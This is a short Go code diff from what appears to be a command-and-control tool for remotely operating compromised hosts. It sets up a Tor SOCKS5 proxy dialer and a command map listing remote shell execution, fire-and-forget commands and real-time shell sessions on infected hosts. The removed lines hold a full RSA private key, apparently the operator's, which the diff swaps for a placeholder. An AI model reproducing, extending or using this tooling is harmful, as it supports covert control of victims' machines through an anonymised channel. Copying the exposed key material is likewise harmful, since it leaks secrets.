@@ -42,64 +42,14 @@ var (
 		yellowColor = ""
 		endColor    = ""
 
-		operKey = []byte(`-----BEGIN RSA PRIVATE KEY-----
-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
------END RSA PRIVATE KEY-----`)
+		operKey = []byte(`YOUR RSA PRIVATE KEY HERE PEM ENCODED`)
 
 	torProxyUrl, _ = url.Parse("SOCKS5H://127.0.0.1:9050")
 	tbDialer, _ = proxy.FromURL(torProxyUrl, proxy.Direct)
 
 	logAsyncChn = make(chan []string)
 
-	commands = map[string]string {
+	commands = map[string]string { // not all instructions, wait for future update 
 		"shell [command]": "Executes a single shell command on host and waits for output",
 		"shellnoop [command]": "Executes a single shell command on host without waiting for output",
 		"shellrt [command]": "Establishes a real-time shell session for a single host",
